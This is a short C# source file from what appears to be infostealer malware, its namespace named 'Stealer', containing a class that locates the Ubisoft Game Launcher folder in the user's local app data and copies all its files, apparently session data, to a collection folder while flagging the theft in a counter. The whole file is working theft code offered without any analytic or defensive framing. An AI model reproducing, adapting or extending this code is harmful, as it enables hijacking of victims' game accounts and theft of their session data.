using System.IO;

namespace Stealer;

internal sealed class Uplay
{
	private static string path = Path.Combine(Paths.lappdata, "Ubisoft Game Launcher");

	public static bool GetUplaySession(string sSavePath)
	{
		if (!Directory.Exists(path))
		{
			return false;
		}
		Directory.CreateDirectory(sSavePath);
		string[] files = Directory.GetFiles(path);
		foreach (string sourceFileName in files)
		{
			File.Copy(sourceFileName, Path.Combine(sSavePath, Path.GetFileName(sourceFileName)));
		}
		Counter.Uplay = true;
		return true;
	}
}
